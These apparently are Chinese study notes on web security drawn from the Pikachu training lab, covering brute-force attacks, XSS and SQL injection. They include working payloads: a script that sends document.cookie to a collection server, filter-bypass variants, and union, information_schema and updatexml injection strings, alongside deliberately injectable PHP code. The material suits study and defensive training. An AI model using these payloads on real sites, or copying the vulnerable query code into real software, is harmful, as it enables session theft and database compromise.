<!-- TOC -->

- [Web安全](#web%E5%AE%89%E5%85%A8)
    - [暴力破解漏洞](#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%BC%8F%E6%B4%9E)
        - [有效的字典](#%E6%9C%89%E6%95%88%E7%9A%84%E5%AD%97%E5%85%B8)
        - [漏洞测试流程](#%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B)
        - [验证码](#%E9%AA%8C%E8%AF%81%E7%A0%81)
        - [防范措施](#%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD)
    - [跨站脚本漏洞 - XSS](#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%BC%8F%E6%B4%9E---xss)
        - [跨站脚本漏洞概述](#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0)
        - [反射型XSSget](#%E5%8F%8D%E5%B0%84%E5%9E%8Bxssget)
        - [存储型XSS](#%E5%AD%98%E5%82%A8%E5%9E%8Bxss)
        - [DOM型XSS](#dom%E5%9E%8Bxss)
        - [案例1：GET型XSS获取cookie](#%E6%A1%88%E4%BE%8B1get%E5%9E%8Bxss%E8%8E%B7%E5%8F%96cookie)
        - [案例2：POST型XSS获取cookie](#%E6%A1%88%E4%BE%8B2post%E5%9E%8Bxss%E8%8E%B7%E5%8F%96cookie)
        - [案例3：XSS钓鱼 - basic认证](#%E6%A1%88%E4%BE%8B3xss%E9%92%93%E9%B1%BC---basic%E8%AE%A4%E8%AF%81)
        - [案例4：XSS键盘记录](#%E6%A1%88%E4%BE%8B4xss%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95)
        - [XSS盲打](#xss%E7%9B%B2%E6%89%93)
        - [XSS绕过-过滤-转换](#xss%E7%BB%95%E8%BF%87-%E8%BF%87%E6%BB%A4-%E8%BD%AC%E6%8D%A2)
        - [XSS绕过-过滤-编码](#xss%E7%BB%95%E8%BF%87-%E8%BF%87%E6%BB%A4-%E7%BC%96%E7%A0%81)
        - [XSS绕过-htmlspecialchars使用](#xss%E7%BB%95%E8%BF%87-htmlspecialchars%E4%BD%BF%E7%94%A8)
        - [XSS实战练习](#xss%E5%AE%9E%E6%88%98%E7%BB%83%E4%B9%A0)
    - [SQL注入](#sql%E6%B3%A8%E5%85%A5)
        - [数字型注入](#%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5)
        - [字符型注入](#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5)
        - [搜索型注入](#%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5)
        - [xx型注入](#xx%E5%9E%8B%E6%B3%A8%E5%85%A5)
        - [案例1-基于union的信息获取](#%E6%A1%88%E4%BE%8B1-%E5%9F%BA%E4%BA%8Eunion%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96)
        - [mysql相关知识](#mysql%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86)
        - [案例2-基于information_schema的信息获取](#%E6%A1%88%E4%BE%8B2-%E5%9F%BA%E4%BA%8Einformation_schema%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96)
        - [案例3-基于函数报错的信息获取](#%E6%A1%88%E4%BE%8B3-%E5%9F%BA%E4%BA%8E%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96)
        - [案例4-基于insert、update、delete的注入](#%E6%A1%88%E4%BE%8B4-%E5%9F%BA%E4%BA%8Einsertupdatedelete%E7%9A%84%E6%B3%A8%E5%85%A5)
    - [相关链接](#%E7%9B%B8%E5%85%B3%E9%93%BE%E6%8E%A5)

<!-- /TOC -->
# Web安全


## 暴力破解漏洞

暴力破解 = 连续性尝试 + 字典+ 自动化

### 有效的字典

- 弱口令，简单的密码，如111111或者123456，常用的账户密码，如admin/root
- 社工库，已收集的账号密码，比如脱裤收集的，可以撞库
- 遵循注册时的密码要求，使用指定字符利用工具按照规则生成密码

### 漏洞测试流程

- 确认暴力破解的可能性，如抓包
- 优化字典，如密码限定字符、长度
- 配置自动化工具，如超时时间、重试次数
- [常见字典](https://github.com/danielmiessler/SecLists)
- 注意事项：字典导入时不能有中文路径

### 验证码

- 作用
    - 防止登陆时的暴力破解
    - 防止机器恶意注册
- 认证流程
    - 登陆页面，后台生成验证码，同时使用算法生成图片，并将图片 response 给客户端，同时将算法生成的值全局赋值存到 session 中
    - 校验验证码，客户端将认证信息和验证码一同提交，后台对提交的验证码与 session 里面的验证码进行比较
    - 客户端重新刷新页面，再次生成新的验证码，验证码算法中一般包含随机函数，所以每次刷新都会改变
- 不安全验证码 - 客户端
    - 使用前端js实现验证码(纸老虎)
    - 验证码在cookie容易泄露，可被获取
    - 将验证码在前端源代码中泄露，容易被获取
- 不安全验证码 - 服务端
    - 验证码在后台不过期，导致可以长期被使用
    - 验证码校验不严格，逻辑出现问题
    - 验证码设计的太过简单或者有规律，容易被猜解
    - [session？](https://zhuanlan.zhihu.com/p/164696755)

### 防范措施

- 设计安全的验证码（安全的流程 + 复杂而又可用的图形）
- 对认证错误的提交进行计数并给出限制，比如连续5次密码错误，锁定2小时
- 必要的情况下，使用双因素认证
- token对防止暴力破解没有用



## 跨站脚本漏洞 - XSS

### 跨站脚本漏洞概述

- XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在 OWASP TOP10的排名前三
- XSS是一种发生在Web前端的漏洞，所以其危害的对象也主要是前端用户
- XSS漏洞可以用来进行钓鱼攻击、前端js挖矿、用户 cookie 获取。甚至可以结合浏览自身的漏洞对用户主机进行远程控制
- 常见类型
  - 反射型，交互的数据一般不会被存在在数据库里面，一次性，一般岀现在查询类页面等
  - 存储型，存储在数据库里面，永久性，一般岀现在留言板，注册等页面
  - DOM型，不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的问题，一次性，也属于反射型
漏洞形成原因：主要原因是程序对输入和输出的控制不够严格，导致“精心构造”的脚本输入后，在输到前端时被浏览器当作有效代码解析执行从而产生危害
- 测试流程
  - 在目标站点上找到输入点，比如查询接口，留言板等
  - 输入一组“特殊字符 + 唯一识别字符”，点击提交后，查看返回的源码，是否有做对应的处理
  - 通过搜索定位到唯一字符，结合唯一字符前后语法确认是否可以构造执行js的条件（构造闭合）
  - 提交构造的脚本代码（以及各种绕过姿势），看是否可以成功执行，如果成功执行则说明存在XS漏洞
- TIPS
  - 一般查询接口容易出现反射型XSS，留言板容易岀现存储型XSS
  - 由于后台可能存在过滤措施，构造的script可能会被过滤掉，而无法生效，或者环境限制了执行(浏览器)
  - 通过变化不同的script，尝试绕过后台过滤机制

### 反射型XSS(get)

该测试中，前台未进行输入限制，后台未进行输入转义，导致js脚本正常执行，构成反射性XSS

```html
<p class='notice'>who is <script>alert('xss')</script>,i don't care!</p> 
```
对于get型XSS，payload直接放在url中

```html
http://192.168.43.65/pikachu/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E&submit=submit
```

- GET方式的XSS漏洞更加容易被利用，一般利用的方式是将带有跨站脚本的url伪装后发送给目标，而POST方式由于是以表单方式提交，无法直接使用URL方式进行攻击
- GET和POST典型区别：GET是以url方式提交数据，POST是以表单方式在请求体里面提交

### 存储型XSS

存储型XSS漏洞跟反射型形成的原因一样，不同的是存储型XSS下攻击者可以将脚本注入到后台存储起来，构成更加持久的危害，因此存储型XSS也称“永久型”XSS。

```html
<p class='con'><script>alert('xss')</script></p>
<http://192.168.43.65/pikachu/vul/xss/xss_stored.php>
```


### DOM型XSS

[DOM举例](https://www.w3school.com.cn/tiy/t.asp?f=hdom_document_getbyid)

```html
<!--源码-->
<a href='"+str+"'>what do you see?</a>
<!--payload-->
#' onclick="alert('xss')"/>
<!--闭合-->
<a href='#' onclick="alert('xss')"/>'>what do you see?</a>
```

### 案例1：GET型XSS获取cookie

```html
<!--注意pkxss的路径-->
<script>document.location = 'http://192.168.43.65/pikachu/pkxss/xcookie/cookie.php?cookie=' + document.cookie;</script>

192.168.43.65/pikachu/vul/xss/xss_reflected_get.php?message=<script>document.location+%3D+'http%3A%2F%2F192.168.43.65%2Fpikachu%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D'+%2B+document.cookie%3B<%2Fscript>&submit=submit
```

[什么是cookie？](https://www.jianshu.com/p/6fc9cea6daa2)

### 案例2：POST型XSS获取cookie

### 案例3：XSS钓鱼 - basic认证

### 案例4：XSS键盘记录

**什么是跨域？**

| http:// | www.   | xyz.com: | 8080 | /script/test.js |
| ------- | ------ | -------- | ---- | --------------- |
| 协议    | 子域名 | 主域名   | 端口 | 资源地址        |

当协议、主机（主域名,子域名）、端口中的任意一个不相同时，称为不同域。我们把不同的域之间请求数据的操作，称为跨域操作。

**跨域-同源策略**
- 为了安全考虑，所有的浏览器都约定了“同源策略”,，同源策略规定，两个不同域名之间不能使用JS进行相互操- 作。
- 比如: x.com域名下的javascript并不能操作y.com域下的对象。
- 如果想要跨域操作,则需要管理员进行特殊的配置。

### XSS盲打

用户提交信息，推测后台管理员会看，输出在管理员看到的页面。获取管理员cookie，冒充管理员在后台为所欲为。

### XSS绕过-过滤-转换

1. 前端限制绕过,直接抓包重放,或者修改html前端代码
2. 大小写,比如:<SCriPt>
3. 拼凑:<scr<script>ipt> 
4. 使用注释进行干扰:<scri<!--test-->pt>

### XSS绕过-过滤-编码

核心思路：后台过滤了特殊字符,比如<script>标签,但该标签可以被各种编码,后台不一定会过滤,当浏览器对该编码进行识别时,会翻译成正常的标签，从而执行.
注意：在使用编码时需要注意编码在输出点是否会被正常识别和翻译.
```html
<!--例如-->
<img src=x onerror=”alert('xss')" />可以把alert("xss")进行html编码
<img src=x onerror "&#97;&# 108;&# 101;&# 114;&# 116;&#40;&#39;&# 120;&# 115;&# 115;&#39;&#41;
```


### XSS绕过-htmlspecialchars()使用

### XSS实战练习

xss-lab，放在xmapp的htdocs文件夹中，打开apache，访问即可。


## SQL注入
在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。

### 数字型注入
```php
//后台源码
if(isset($_POST['submit']) && $_POST['id']!=null){
    //这里没有做任何处理，直接拼到select里面去了,形成Sql注入
    $id=$_POST['id'];
    $query="select username,email from member where id=$id";
    $result=execute($link, $query);
    //这里如果用==1,会严格一点
    if(mysqli_num_rows($result)>=1){
        while($data=mysqli_fetch_assoc($result)){
            $username=$data['username'];
            $email=$data['email'];
            $html.="<p class='notice'>hello,{$username} <br />your email is: {$email}</p>";
        }
    }else{
        $html.="<p class='notice'>您输入的user id不存在，请重新输入！</p>";
    }
}
```
```sql
--正常查询出一条记录
select eamil where user_id = 1 --or 1=1; 
--注入，查询所有记录
select eamil where user_id = 1 or 1 = 1；
```

### 字符型注入
```php
//后台源码
if(isset($_GET['submit']) && $_GET['name']!=null){
    //这里没有做任何处理，直接拼到select里面去了
    $name=$_GET['name'];
    //这里的变量是字符型，需要考虑闭合
    $query="select id,email from member where username='$name'";
    $result=execute($link, $query);
    if(mysqli_num_rows($result)>=1){
        while($data=mysqli_fetch_assoc($result)){
            $id=$data['id'];
            $email=$data['email'];
            $html.="<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";
        }
    }else{

        $html.="<p class='notice'>您输入的username不存在，请重新输入！</p>";
    }
}
```
```sql
--正常情况
select email from users where username = 'kobe';-- kobe' or 1=1#
--在url中构造闭合，注入
select email from users where username = 'kobe' or 1=1#'
```

### 搜索型注入
```php
//后台源码
if(isset($_GET['submit']) && $_GET['name']!=null){

    //这里没有做任何处理，直接拼到select里面去了
    $name=$_GET['name'];

    //这里的变量是模糊匹配，需要考虑闭合
    $query="select username,id,email from member where username like '%$name%'";
    $result=execute($link, $query);
    if(mysqli_num_rows($result)>=1){
        //彩蛋:这里还有个xss
        $html2.="<p class='notice'>用户名中含有{$_GET['name']}的结果如下：<br />";
        while($data=mysqli_fetch_assoc($result)){
            $uname=$data['username'];
            $id=$data['id'];
            $email=$data['email'];
            $html1.="<p class='notice'>username：{$uname}<br />uid:{$id} <br />email is: {$email}</p>";
        }
    }else{

        $html1.="<p class='notice'>0o。..没有搜索到你输入的信息！</p>";
    }
}
```

```sql
--正常情况
select email from users where username like '%k%'; --k%' or 1=1#
--构造闭合，注入
select email from users where username like '%k%' or 1=1#%';

```

### xx型注入
```php
//后台源码
if(isset($_GET['submit']) && $_GET['name']!=null){
    //这里没有做任何处理，直接拼到select里面去了
    $name=$_GET['name'];
    //这里的变量是字符型，需要考虑闭合
    $query="select id,email from member where username=('$name')";
    $result=execute($link, $query);
    if(mysqli_num_rows($result)>=1){
        while($data=mysqli_fetch_assoc($result)){
            $id=$data['id'];
            $email=$data['email'];
            $html.="<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";
        }
    }else{

        $html.="<p class='notice'>您输入的username不存在，请重新输入！</p>";
    }
}

```

```sql
--正常情况
select email from users where username = kobe;
--构造闭合，注入
select email from users where username = 'kobe') or 1=1#;
```

```sql
--通过一个输入，查看返回结果，并判断输入是否参与后台的sql语句中
---如果1正常输出，2不能正常输出，说明拼接成功，存在sql漏洞
kobe' and 1=1#;
kobe' and 1=2#;

--单个字符的测试，如'或者"，欺骗后天数据库报错
```
总结：闭合测试，构造sql，欺骗后台执行

>小知识：MySQ有三种注释，``#`` ``--`` ``/**/``

### 案例1-基于union的信息获取
```sql
select email from users where id = 1 union select database();
select email from users where id = 1 union select user();
select email from users where id = 1 union select version();
--字符型sql注入闭合，先用order by判断字段数，假设为1
xx' union select database();
```
### mysql相关知识
```sql
--union用法，前后字段数一致
select email from users where id = 1
 union 
select 字段1 from 表名 where 条件;
select database();--获取当前数据库名称
select user();--当前用户权限
select version();--当前数据库版本

show databases;--查看所有数据库
show tables;--查看所有表
desc user;--查看user表所有字段
use information_schema;--切换数据库
--查询表中有几个字段
---使用第一列进行排序，如果第一列存在，则可以正常输出，否则错误
select id from users where username = 'kobe' order by 1;

```

### 案例2-基于information_schema的信息获取
mysql自带一个数据库 information_schema 非常重要，里面有很多信息。
```sql
--获取当前数据库名称 pikachu 
select email,username from users where id = 1
 union
select database(),user();
----payload
kobe' union select database(),user()#

--获取表名 users
select email,username from users where id = 1
 union 
select table_schema,table_name from information_schema.tables where table_schema = 'pikachu';
---payload
kobe' union select table_schema,table_name from information_schema.tables where table_schema = 'pikachu'#

--获取字段名
select email,username from users where id = 1
 union 
select table_name,column_name from information_schema.columns where table_name = 'users';
---payload
kobe' union select table_name,column_name from information_schema.columns where table_name = 'users'#

--获取内容
select email,username from users where id = 1
 union 
select username,password from users;
---payload
kobe' union select username,password from users#

```

### 案例3-基于函数报错的信息获取
背景条件：后台没有屏蔽数据库报错信息或者做标准化处理，在语法发生错误时会输出在前端
- updatexml(xml_document,XpathString,new_value): 是MySQL对XML文档数据进行查询和修改的XPATH函数,XpathString必须是有效的，否则报错
- extractvalue(xml_document,XpathString): 是MySQL对XML文档数据进行查询的XPATH函数,XpathString必须是有效的，否则报错
- floor(): MySQL中用来取整的函数

```sql
--第一步，先检查有没有报错信息返回
--第二部，构造payload
kobe' and updatexml(1,version(),0)# --输出version信息不完整
kobe' and updatexml(1,concat(0x7e,version()),0)# --0x7e是~的16进制
kobe' and updatexml(1,concat(0x7e,database()),0)#

--使用上次使用schema的select语句，替换version()
kobe' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema = 'pikachu')),0)# --Operand should contain 1 column(s)
--使用这种方式，可以和之前一样，一个一个的拿到表，拿到字段，拿到信息
kobe' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema = 'pikachu' limit 0,1)),0)# --XPATH syntax error: '~httpinfo',limit 0/1/2/3/4/5 1
```

### 案例4-基于insert、update、delete的注入
不同于select注入，不能使用union
```sql
--正常语句，insert注入多用在注册类环境下
insert into users(username,password,id) values('xiaoming',123456,001);
--使用 ' or …… or ' 拼接
insert into users(username,password,id) values('xiaoming' or updatexml(1,concat(0x7e,version()),0) or '',123456,001);
--payload
xiaoming' or updatexml(1,concat(0x7e,version()),0) or '

--update多用在更新信息环境下
xiaoming' or updatexml(1,concat(0x7e,version()),0) or ' ----payload，类似于insert

--delete注入
1 or updatexml(1,concat(0x7e,version()),0) or '
--正常情况
delete from message where id = 1;
```



## 相关链接
[视频教程](https://www.ichunqiu.com/course/63838)[|靶场](https://github.com/zhuifengshaonianhanlu/pikachu)